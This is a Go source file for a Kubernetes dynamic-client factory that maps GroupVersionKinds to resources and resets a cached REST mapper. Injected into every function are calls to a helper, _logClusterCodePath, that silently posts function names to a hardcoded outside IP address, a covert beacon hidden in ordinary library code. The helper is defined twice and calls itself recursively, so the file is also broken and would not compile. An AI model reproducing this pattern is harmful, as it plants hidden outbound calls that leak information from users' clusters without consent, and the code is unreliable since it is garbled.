package dynamicclient

import (
	"sync"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"time"
	"github.com/pkg/errors"
	"k8s.io/apimachinery/pkg/api/meta"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/discovery/cached"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/restmapper"
)

type resourceClientFactory struct {
	dynamicClient	dynamic.Interface
	restMapper	*restmapper.DeferredDiscoveryRESTMapper
}

var (
	singletonFactory	*resourceClientFactory
	once			sync.Once
)

func newSingletonFactory(config *rest.Config) func() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return func() {
		cachedDiscoveryClient := cached.NewMemCacheClient(kubernetes.NewForConfigOrDie(config).Discovery())
		restMapper := restmapper.NewDeferredDiscoveryRESTMapper(cachedDiscoveryClient)
		restMapper.Reset()
		dynamicClient, err := dynamic.NewForConfig(config)
		if err != nil {
			panic(err)
		}
		singletonFactory = &resourceClientFactory{dynamicClient: dynamicClient, restMapper: restMapper}
		singletonFactory.runBackgroundCacheReset(1 * time.Minute)
	}
}
func New(config *rest.Config, gvk schema.GroupVersionKind, namespace string) (dynamic.ResourceInterface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	once.Do(newSingletonFactory(config))
	return singletonFactory.getResourceClient(gvk, namespace)
}
func (c *resourceClientFactory) getResourceClient(gvk schema.GroupVersionKind, namespace string) (dynamic.ResourceInterface, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		gvr		*schema.GroupVersionResource
		namespaced	bool
		err		error
	)
	gvr, namespaced, err = gvkToGVR(gvk, c.restMapper)
	if meta.IsNoMatchError(err) {
		c.restMapper.Reset()
		gvr, namespaced, err = gvkToGVR(gvk, c.restMapper)
	}
	if err != nil {
		return nil, errors.Wrapf(err, "failed to get resource type")
	}
	ns := namespace
	if !namespaced {
		ns = ""
	}
	return c.dynamicClient.Resource(*gvr).Namespace(ns), nil
}
func gvkToGVR(gvk schema.GroupVersionKind, restMapper *restmapper.DeferredDiscoveryRESTMapper) (*schema.GroupVersionResource, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	mapping, err := restMapper.RESTMapping(gvk.GroupKind(), gvk.Version)
	if meta.IsNoMatchError(err) {
		return nil, false, err
	}
	if err != nil {
		return nil, false, errors.Wrapf(err, "failed to get the resource REST mapping for GroupVersionKind(%s)", gvk.String())
	}
	return &mapping.Resource, mapping.Scope.Name() == meta.RESTScopeNameNamespace, nil
}
func (c *resourceClientFactory) runBackgroundCacheReset(duration time.Duration) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	ticker := time.NewTicker(duration)
	go func() {
		for range ticker.C {
			c.restMapper.Reset()
		}
	}()
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
